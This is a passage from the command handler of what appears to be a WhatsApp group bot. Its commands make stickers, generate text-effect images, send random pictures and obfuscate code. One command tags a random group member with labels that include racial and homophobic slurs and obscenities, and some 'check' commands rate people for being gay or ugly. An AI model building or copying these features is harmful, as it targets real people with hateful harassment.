if (!quoted) return replygcdeepak(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await DeepakBotInc.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return replygcdeepak('Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds')
let media = await quoted.download()
let encmedia = await DeepakBotInc.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
replygcdeepak(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
}
}
break
case 'stupid':
      case 'foolish':
      case 'smart':
      case 'idiot':
      case 'gay':
      case 'lesbi':
      case 'bastard':
      case 'stubble':
      case 'dog':
      case 'fuck':
      case 'ape':
      case 'noob':
      case 'great':
      case 'horny':
      case 'wibu':
      case 'asshole':
      case 'handsome':
      case 'beautiful':
      case 'cute':
      case 'kind':
      case 'ugly':
      case 'pretty':
      case 'lesbian':
      case 'randi':
      case 'gandu':
      case 'madarchod':
      case 'kala':
      case 'gora':
      case 'chutiya':
      case 'nibba':
      case 'nibbi':
      case 'bhosdiwala':
      case 'chutmarika':
      case 'bokachoda':
      case 'suarerbaccha':
      case 'bolochoda':
      case 'muthal':
      case 'muthbaaz':
      case 'randibaaz':
      case 'topibaaz':
      case 'cunt':
      case 'nerd':
      case 'behenchod':
      case 'behnchoda':
      case 'bhosdika':
      case 'nerd':
      case 'mc':
      case 'bsdk':
      case 'bhosdk':
      case 'nigger':
      case 'loda':
      case 'laund':
      case 'nigga':
      case 'noobra':
      case 'tharki':
      case 'nibba':
      case 'nibbi':
      case 'mumu':
      case 'rascal':
      case 'scumbag':
      case 'nuts':
      case 'comrade':
      case 'fagot':
      case 'scoundrel':
      case 'ditch':
      case 'dope':
      case 'gucci':
      case 'lit':
      case 'dumbass':
      case 'sexy':
      case 'crackhead':
      case 'mf':
      case 'motherfucker':
      case 'dogla':
      case 'bewda':
      case 'boka':
      case 'khanki':
      case 'bal':
      case 'sucker':
      case 'fuckboy':
      case 'playboy':
      case 'fuckgirl':
      case 'playgirl':
      case 'hot': {
if (!m.isGroup) return replygcdeepak(mess.group)
let member = participants.map((u) => u.id)
let org = member[Math.floor(Math.random() * member.length)]
DeepakBotInc.sendMessage(m.chat,
{ text: `The Most ${command} Here Is @${org.split('@')[0]}`,
contextInfo:{
mentionedJid:[org],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": fs.readFileSync(`./DeepakMedia/theme/Zenitsu.jpg`),
"sourceUrl": `${wagc}`}}},
{ quoted: m})
}
break
case 'quotes':
const quotedeepak = await axios.get(`https://favqs.com/api/qotd`)
        const textquotes = `*${themeemoji} Quote:* ${quotedeepak.data.quote.body}\n\n*${themeemoji} Author:* ${quotedeepak.data.quote.author}`
return replygcdeepak(textquotes)
break
case 'handsomecheck':
				if (!text) return replygcdeepak(`Tag Someone, Example : ${prefix + command} @Deepak`)
					const gan = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const teng = gan[Math.floor(Math.random() * gan.length)]
DeepakBotInc.sendMessage(from, { text: `*${command}*\n\nName : ${q}\nAnswer : *${teng}%*` }, { quoted: m })
					break
case 'beautifulcheck':
				if (!text) return replygcdeepak(`Tag Someone, Example : ${prefix + command} @Deepak`)
					const can = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const tik = can[Math.floor(Math.random() * can.length)]
DeepakBotInc.sendMessage(from, { text: `*${command}*\n\nNama : ${q}\nAnswer : *${tik}%*` }, { quoted: m })
					break
					case 'charactercheck':
					if (!text) return replygcdeepak(`Tag Someone, Example : ${prefix + command} @Deepak`)
					const deepak =['Compassionate','Generous','Grumpy','Forgiving','Obedient','Good','Simp','Kind-Hearted','patient','UwU','top, anyway','Helpful']
					const taky = deepak[Math.floor(Math.random() * deepak.length)]
					DeepakBotInc.sendMessage(from, { text: `Character Check : ${q}\nAnswer : *${taky}*` }, { quoted: m })
				     break
case 'awesomecheck':
  case 'greatcheck':
    case 'gaycheck':
      case 'cutecheck':
        case 'lesbicheck':
          case 'lesbiancheck':
             case 'hornycheck':
                 case 'prettycheck':
                    case 'lovelycheck':
                      case 'uglycheck':
if (!m.isGroup) return replygcdeepak(mess.group)
const cex = body.slice(0)
const cek1 = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const cek2 = cek1[Math.floor(Math.random() * cek1.length)]
if (mentionByReply) {
DeepakBotInc.sendMessage(from, { text: 'Question : *' + cex + '*\nChecker : ' + `@${mentionByReply.split('@')[0]}` + '\nAnswer : ' + cek2 + '%', mentions: [mentionByReply] }, { quoted: m })
} else if (mentionByTag[0] && isGroup) {
DeepakBotInc.sendMessage(from, { text: 'Question : *' + cex + '*\nChecker : ' + `@${mentionByTag[0].split('@')[0]}` + '\nAnswer : ' + cek2 + '%', mentions: [mentionByTag[0]] }, { quoted: m })
} else if (!mentionByReply && !mentionByTag[0]) {
DeepakBotInc.sendMessage(from, { text: 'Question : *' + cex + '*\nChecker : ' + `@${sender.split('@')[0]}` + '\nAnswer : ' + cek2 + '%', mentions: [sender] }, { quoted: m })
}
break
case 'obfus': case 'obfuscate':{
if (!q) return replygcdeepak(`Example ${prefix+command} const deepakbot = require('baileys')`)
let meg = await obfus(q)
replygcdeepak(`Success
${meg.result}`)
}
break
case 'style': case 'styletext': {
		let { styletext } = require('./lib/scraper')
		if (!text) return replygcdeepak('Enter Query text!')
                let anu = await styletext(text)
                let teks = `Style Text From ${text}\n\n`
                for (let i of anu) {
                    teks += `${themeemoji} *${i.name}* : ${i.result}\n\n`
                }
                replygcdeepak(teks)
	    }
	    break
case 'candy': 
case 'christmas': 
case '3dchristmas': 
case 'sparklechristmas':
case 'deepsea': 
case 'scifi': 
case 'rainbow': 
case 'waterpipe': 
case 'spooky': 
case 'pencil': 
case 'circuit': 
case 'discovery': 
case 'metalic': 
case 'fiction': 
case 'demon': 
case 'transformer': 
case 'berry': 
case 'thunder': 
case 'magma': 
case '3dstone': 
case 'neonlight': 
case 'glitch': 
case 'harrypotter': 
case 'brokenglass': 
case 'papercut': 
case 'watercolor': 
case 'multicolor': 
case 'neondevil': 
case 'underwater': 
case 'graffitibike':
case 'snow': 
case 'cloud': 
case 'honey': 
case 'ice': 
case 'fruitjuice': 
case 'biscuit': 
case 'wood': 
case 'chocolate': 
case 'strawberry': 
case 'matrix': 
case 'blood': 
case 'dropwater': 
case 'toxic': 
case 'lava': 
case 'rock': 
case 'bloodglas': 
case 'hallowen': 
case 'darkgold': 
case 'joker': 
case 'wicker':
case 'firework': 
case 'skeleton': 
case 'blackpink': 
case 'sand': 
case 'glue': 
case '1917': 
case 'leaves': {
if (!isPrem) return replyprem(mess.premium)
if (!q) return replygcdeepak(`Example : ${prefix+command} DeepakBotInc`) 
replygcdeepak(mess.wait)
let link
if (/candy/.test(command)) link = 'https://textpro.me/create-christmas-candy-cane-text-effect-1056.html'
if (/christmas/.test(command)) link = 'https://textpro.me/christmas-tree-text-effect-online-free-1057.html'
if (/3dchristmas/.test(command)) link = 'https://textpro.me/3d-christmas-text-effect-by-name-1055.html'
if (/sparklechristmas/.test(command)) link = 'https://textpro.me/sparkles-merry-christmas-text-effect-1054.html'
if (/deepsea/.test(command)) link = 'https://textpro.me/create-3d-deep-sea-metal-text-effect-online-1053.html'
if (/scifi/.test(command)) link = 'https://textpro.me/create-3d-sci-fi-text-effect-online-1050.html'
if (/rainbow/.test(command)) link = 'https://textpro.me/3d-rainbow-color-calligraphy-text-effect-1049.html'
if (/waterpipe/.test(command)) link = 'https://textpro.me/create-3d-water-pipe-text-effects-online-1048.html'
if (/spooky/.test(command)) link = 'https://textpro.me/create-halloween-skeleton-text-effect-online-1047.html'
if (/pencil/.test(command)) link = 'https://textpro.me/create-a-sketch-text-effect-online-1044.html'
if (/circuit/.test(command)) link = 'https://textpro.me/create-blue-circuit-style-text-effect-online-1043.html'
if (/discovery/.test(command)) link = 'https://textpro.me/create-space-text-effects-online-free-1042.html'
if (/metalic/.test(command)) link = 'https://textpro.me/creat-glossy-metalic-text-effect-free-online-1040.html'
if (/fiction/.test(command)) link = 'https://textpro.me/create-science-fiction-text-effect-online-free-1038.html'
if (/demon/.test(command)) link = 'https://textpro.me/create-green-horror-style-text-effect-online-1036.html'
if (/transformer/.test(command)) link = 'https://textpro.me/create-a-transformer-text-effect-online-1035.html'
if (/berry/.test(command)) link = 'https://textpro.me/create-berry-text-effect-online-free-1033.html'
if (/thunder/.test(command)) link = 'https://textpro.me/online-thunder-text-effect-generator-1031.html'
if (/magma/.test(command)) link = 'https://textpro.me/create-a-magma-hot-text-effect-online-1030.html'
if (/3dstone/.test(command)) link = 'https://textpro.me/3d-stone-cracked-cool-text-effect-1029.html'
if (/neonlight/.test(command)) link = 'https://textpro.me/create-3d-neon-light-text-effect-online-1028.html'
if (/glitch/.test(command)) link = 'https://textpro.me/create-impressive-glitch-text-effects-online-1027.html'
if (/harrypotter/.test(command)) link = 'https://textpro.me/create-harry-potter-text-effect-online-1025.html'
if (/brokenglass/.test(command)) link = 'https://textpro.me/broken-glass-text-effect-free-online-1023.html'
if (/papercut/.test(command)) link = 'https://textpro.me/create-art-paper-cut-text-effect-online-1022.html'
if (/watercolor/.test(command)) link = 'https://textpro.me/create-a-free-online-watercolor-text-effect-1017.html'
if (/multicolor/.test(command)) link = 'https://textpro.me/online-multicolor-3d-paper-cut-text-effect-1016.html'
if (/neondevil/.test(command)) link = 'https://textpro.me/create-neon-devil-wings-text-effect-online-free-1014.html'
if (/underwater/.test(command)) link = 'https://textpro.me/3d-underwater-text-effect-generator-online-1013.html'
if (/graffitibike/.test(command)) link = 'https://textpro.me/create-wonderful-graffiti-art-text-effect-1011.html'
if (/snow/.test(command)) link = 'https://textpro.me/create-snow-text-effects-for-winter-holidays-1005.html'
if (/cloud/.test(command)) link = 'https://textpro.me/create-a-cloud-text-effect-on-the-sky-online-1004.html'
if (/honey/.test(command)) link = 'https://textpro.me/honey-text-effect-868.html'
if (/ice/.test(command)) link = 'https://textpro.me/ice-cold-text-effect-862.html'
if (/fruitjuice/.test(command)) link = 'https://textpro.me/fruit-juice-text-effect-861.html'
if (/biscuit/.test(command)) link = 'https://textpro.me/biscuit-text-effect-858.html'
if (/wood/.test(command)) link = 'https://textpro.me/wood-text-effect-856.html'
if (/chocolate/.test(command)) link = 'https://textpro.me/chocolate-cake-text-effect-890.html'
if (/strawberry/.test(command)) link = 'https://textpro.me/strawberry-text-effect-online-889.html'
if (/matrix/.test(command)) link = 'https://textpro.me/matrix-style-text-effect-online-884.html'
if (/blood/.test(command)) link = 'https://textpro.me/horror-blood-text-effect-online-883.html'
if (/dropwater/.test(command)) link = 'https://textpro.me/dropwater-text-effect-872.html'
if (/toxic/.test(command)) link = 'https://textpro.me/toxic-text-effect-online-901.html'
if (/lava/.test(command)) link = 'https://textpro.me/lava-text-effect-online-914.html'
if (/rock/.test(command)) link = 'https://textpro.me/rock-text-effect-online-915.html'
if (/bloodglas/.test(command)) link = 'https://textpro.me/blood-text-on-the-frosted-glass-941.html'
if (/hallowen/.test(command)) link = 'https://textpro.me/halloween-fire-text-effect-940.html'
if (/darkgold/.test(command)) link = 'https://textpro.me/metal-dark-gold-text-effect-online-939.html'
if (/joker/.test(command)) link = 'https://textpro.me/create-logo-joker-online-934.html'
if (/wicker/.test(command)) link = 'https://textpro.me/wicker-text-effect-online-932.html'
if (/firework/.test(command)) link = 'https://textpro.me/firework-sparkle-text-effect-930.html'
if (/skeleton/.test(command)) link = 'https://textpro.me/skeleton-text-effect-online-929.html'
if (/blackpink/.test(command)) link = 'https://textpro.me/create-blackpink-logo-style-online-1001.html'
if (/sand/.test(command)) link = 'https://textpro.me/write-in-sand-summer-beach-free-online-991.html'
if (/glue/.test(command)) link = 'https://textpro.me/create-3d-glue-text-effect-with-realistic-style-986.html'
if (/1917/.test(command)) link = 'https://textpro.me/1917-style-text-effect-online-980.html'
if (/leaves/.test(command)) link = 'https://textpro.me/natural-leaves-text-effect-931.html'
let anu = await textpro.textpro(link, q)
DeepakBotInc.sendMessage(m.chat, { image: { url: anu }, caption: `${mess.success}` }, { quoted: m })
}
break
case 'glitchtext':
case 'writetext':
case 'advancedglow':
case 'typographytext':
case 'pixelglitch':
case 'neonglitch':
case 'flagtext':
case 'flag3dtext':
case 'deletingtext':
case 'blackpinkstyle':
case 'glowingtext':
case 'underwatertext':
case 'logomaker':
case 'cartoonstyle':
case 'papercutstyle':
case 'watercolortext':
case 'effectclouds':
case 'blackpinklogo':
case 'gradienttext':
case 'summerbeach':
case 'luxurygold':
case 'multicoloredneon':
case 'sandsummer':
case 'galaxywallpaper':
case '1917style':
case 'makingneon':
case 'royaltext':
case 'freecreate':
case 'galaxystyle':
case 'lighteffects':{
if (!isPrem) return replyprem(mess.premium)
if (!q) return replygcdeepak(`Example : ${prefix+command} DeepakBotInc`) 
replygcdeepak(mess.wait)
let link
if (/glitchtext/.test(command)) link = 'https://en.ephoto360.com/create-digital-glitch-text-effects-online-767.html'
if (/writetext/.test(command)) link = 'https://en.ephoto360.com/write-text-on-wet-glass-online-589.html'
if (/advancedglow/.test(command)) link = 'https://en.ephoto360.com/advanced-glow-effects-74.html'
if (/typographytext/.test(command)) link = 'https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html'
if (/pixelglitch/.test(command)) link = 'https://en.ephoto360.com/create-pixel-glitch-text-effect-online-769.html'
if (/neonglitch/.test(command)) link = 'https://en.ephoto360.com/create-impressive-neon-glitch-text-effects-online-768.html'
if (/flagtext/.test(command)) link = 'https://en.ephoto360.com/nigeria-3d-flag-text-effect-online-free-753.html'
if (/flag3dtext/.test(command)) link = 'https://en.ephoto360.com/free-online-american-flag-3d-text-effect-generator-725.html'
if (/deletingtext/.test(command)) link = 'https://en.ephoto360.com/create-eraser-deleting-text-effect-online-717.html'
if (/blackpinkstyle/.test(command)) link = 'https://en.ephoto360.com/online-blackpink-style-logo-maker-effect-711.html'
if (/glowingtext/.test(command)) link = 'https://en.ephoto360.com/create-glowing-text-effects-online-706.html'
if (/underwatertext/.test(command)) link = 'https://en.ephoto360.com/3d-underwater-text-effect-online-682.html'
if (/logomaker/.test(command)) link = 'https://en.ephoto360.com/free-bear-logo-maker-online-673.html'
if (/cartoonstyle/.test(command)) link = 'https://en.ephoto360.com/create-a-cartoon-style-graffiti-text-effect-online-668.html'
if (/papercutstyle/.test(command)) link = 'https://en.ephoto360.com/multicolor-3d-paper-cut-style-text-effect-658.html'
if (/watercolortext/.test(command)) link = 'https://en.ephoto360.com/create-a-watercolor-text-effect-online-655.html'
if (/effectclouds/.test(command)) link = 'https://en.ephoto360.com/write-text-effect-clouds-in-the-sky-online-619.html'
if (/blackpinklogo/.test(command)) link = 'https://en.ephoto360.com/create-blackpink-logo-online-free-607.html'
if (/gradienttext/.test(command)) link = 'https://en.ephoto360.com/create-3d-gradient-text-effect-online-600.html'
if (/summerbeach/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-free-595.html'
if (/luxurygold/.test(command)) link = 'https://en.ephoto360.com/create-a-luxury-gold-text-effect-online-594.html'
if (/multicoloredneon/.test(command)) link = 'https://en.ephoto360.com/create-multicolored-neon-light-signatures-591.html'
if (/sandsummer/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-576.html'
if (/galaxywallpaper/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-wallpaper-mobile-online-528.html'
if (/1917style/.test(command)) link = 'https://en.ephoto360.com/1917-style-text-effect-523.html'
if (/makingneon/.test(command)) link = 'https://en.ephoto360.com/making-neon-light-text-effect-with-galaxy-style-521.html'
if (/royaltext/.test(command)) link = 'https://en.ephoto360.com/royal-text-effect-online-free-471.html'
if (/freecreate/.test(command)) link = 'https://en.ephoto360.com/free-create-a-3d-hologram-text-effect-441.html'
if (/galaxystyle/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-style-free-name-logo-438.html'
if (/lighteffects/.test(command)) link = 'https://en.ephoto360.com/create-light-effects-green-neon-online-429.html'
let haldwhd = await ephoto(link, q)
DeepakBotInc.sendMessage(m.chat, { image: { url: haldwhd }, caption: `${mess.success}` }, { quoted: m })
}
break
case 'shadow': 
case 'write': 
case 'romantic': 
case 'burnpaper':
case 'smoke': 
case 'narutobanner': 
case 'love': 
case 'undergrass':
case 'doublelove': 
case 'coffecup':
case 'underwaterocean':
case 'smokyneon':
case 'starstext':
case 'rainboweffect':
case 'balloontext':
case 'metalliceffect':
case 'embroiderytext':
case 'flamingtext':
case 'stonetext':
case 'writeart':
case 'summertext':
case 'wolfmetaltext':
case 'nature3dtext':
case 'rosestext':
case 'naturetypography':
case 'quotesunder':
case 'shinetext':{
if (!isPrem) return replyprem(mess.premium)
if (!q) return replygcdeepak(`Example : ${prefix+command} DeepakBotInc`) 
replygcdeepak(mess.wait)
let link
if (/stonetext/.test(command)) link = 'https://photooxy.com/online-3d-white-stone-text-effect-utility-411.html'
if (/writeart/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-art-quote-on-wood-heart-370.html'
if (/summertext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/3d-summer-text-effect-367.html'
if (/wolfmetaltext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-a-wolf-metal-text-effect-365.html'
if (/nature3dtext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/make-nature-3d-text-effects-364.html'
if (/rosestext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/yellow-roses-text-360.html'
if (/naturetypography/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-vector-nature-typography-355.html'
if (/quotesunder/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/quotes-under-fall-leaves-347.html'
if (/shinetext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/rainbow-shine-text-223.html'
if (/shadow/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/shadow-text-effect-in-the-sky-394.html'
if (/write/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-text-on-the-cup-392.html'
if (/romantic/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/romantic-messages-for-your-loved-one-391.html'
if (/burnpaper/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-text-on-burn-paper-388.html'
if (/smoke/.test(command)) link = 'https://photooxy.com/other-design/create-an-easy-smoke-type-effect-390.html'
if (/narutobanner/.test(command)) link = 'https://photooxy.com/manga-and-anime/make-naruto-banner-online-free-378.html'
if (/love/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-a-picture-of-love-message-377.html'
if (/undergrass/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/make-quotes-under-grass-376.html'
if (/doublelove/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/love-text-effect-372.html'
if (/coffecup/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/put-any-text-in-to-coffee-cup-371.html'
if (/underwaterocean/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/creating-an-underwater-ocean-363.html'
if (/smokyneon/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/make-smoky-neon-glow-effect-343.html'
if (/starstext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-stars-text-on-the-night-sky-200.html'
if (/rainboweffect/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/glow-rainbow-effect-generator-201.html'
if (/balloontext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/royal-look-text-balloon-effect-173.html'
if (/metalliceffect/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/illuminated-metallic-effect-177.html'
if (/embroiderytext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-embroidery-text-online-191.html'
if (/flamingtext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/realistic-flaming-text-effect-online-197.html'
let dehe = await photooxy.photoOxy(link, q)
DeepakBotInc.sendMessage(m.chat, { image: { url: dehe }, caption: `${mess.success}` }, { quoted: m })
}
break
case 'tiktokgirl':
replygcdeepak(mess.wait)
var asupan = JSON.parse(fs.readFileSync('./ZenitsuBotMedia/tiktokvids/tiktokgirl.json'))
var hasil = pickRandom(asupan)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokghea':
replygcdeepak(mess.wait)
var gheayubi = JSON.parse(fs.readFileSync('./ZenitsuBotMedia/tiktokvids/gheayubi.json'))
var hasil = pickRandom(gheayubi)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokbocil':
replygcdeepak(mess.wait)
var bocil = JSON.parse(fs.readFileSync('./ZenitsuBotMedia/tiktokvids/bocil.json'))
var hasil = pickRandom(bocil)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktoknukhty':
replygcdeepak(mess.wait)
var ukhty = JSON.parse(fs.readFileSync('./ZenitsuBotMedia/tiktokvids/ukhty.json'))
var hasil = pickRandom(ukhty)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktoksantuy':
replygcdeepak(mess.wait)
var santuy = JSON.parse(fs.readFileSync('./ZenitsuBotMedia/tiktokvids/santuy.json'))
var hasil = pickRandom(santuy)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokkayes':
replygcdeepak(mess.wait)
var kayes = JSON.parse(fs.readFileSync('./ZenitsuBotMedia/tiktokvids/kayes.json'))
var hasil = pickRandom(kayes)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokpanrika':
replygcdeepak(mess.wait)
var rikagusriani = JSON.parse(fs.readFileSync('./ZenitsuBotMedia/tiktokvids/panrika.json'))
var hasil = pickRandom(rikagusriani)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktoknotnot':
replygcdeepak(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./ZenitsuBotMedia/tiktokvids/notnot.json'))
var hasil = pickRandom(notnot)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'chinese':
replygcdeepak(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./ZenitsuBotMedia/tiktokpics/china.json'))
var hasil = pickRandom(notnot)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'hijab':
replygcdeepak(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./ZenitsuBotMedia/tiktokpics/hijab.json'))
var hasil = pickRandom(notnot)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'indo':
replygcdeepak(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./ZenitsuBotMedia/tiktokpics/indonesia.json'))
var hasil = pickRandom(notnot)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'japanese':
replygcdeepak(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./ZenitsuBotMedia/tiktokpics/japan.json'))
var hasil = pickRandom(notnot)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'korean':
replygcdeepak(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./ZenitsuBotMedia/tiktokpics/korea.json'))
var hasil = pickRandom(notnot)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'malay':
replygcdeepak(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./ZenitsuBotMedia/tiktokpics/malaysia.json'))
var hasil = pickRandom(notnot)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'randomgirl':
replygcdeepak(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./ZenitsuBotMedia/tiktokpics/random.json'))
var hasil = pickRandom(notnot)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'randomboy':
replygcdeepak(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./ZenitsuBotMedia/tiktokpics/random2.json'))
var hasil = pickRandom(notnot)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'thai':
replygcdeepak(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./ZenitsuBotMedia/tiktokpics/thailand.json'))
var hasil = pickRandom(notnot)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'vietnamese':
replygcdeepak(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./ZenitsuBotMedia/tiktokpics/vietnam.json'))
var hasil = pickRandom(notnot)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'aesthetic':
replygcdeepak(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./ZenitsuBotMedia/randompics/aesthetic.json'))
var hasil = pickRandom(notnot)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'antiwork':
replygcdeepak(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./ZenitsuBotMedia/randompics/antiwork.json'))
var hasil = pickRandom(notnot)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'blackpink':
replygcdeepak(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./ZenitsuBotMedia/randompics/blackpink.json'))
var hasil = pickRandom(notnot)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'bike':
replygcdeepak(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./ZenitsuBotMedia/randompics/bike.json'))
var hasil = pickRandom(notnot)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'boneka':
replygcdeepak(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./ZenitsuBotMedia/randompics/boneka.json'))
var hasil = pickRandom(notnot)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'cosplay':
replygcdeepak(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./ZenitsuBotMedia/randompics/cosplay.json'))
var hasil = pickRandom(notnot)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'cat':
replygcdeepak(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./ZenitsuBotMedia/randompics/cat.json'))
var hasil = pickRandom(notnot)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'doggo':
replygcdeepak(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./ZenitsuBotMedia/randompics/doggo.json'))
var hasil = pickRandom(notnot)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'justina':
replygcdeepak(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./ZenitsuBotMedia/randompics/justina.json'))
var hasil = pickRandom(notnot)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'kayes':
replygcdeepak(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./ZenitsuBotMedia/randompics/kayes.json'))
var hasil = pickRandom(notnot)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'kpop':
replygcdeepak(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./ZenitsuBotMedia/randompics/kpop.json'))
var hasil = pickRandom(notnot)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'notnot':
replygcdeepak(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./ZenitsuBotMedia/randompics/notnot.json'))
var hasil = pickRandom(notnot)
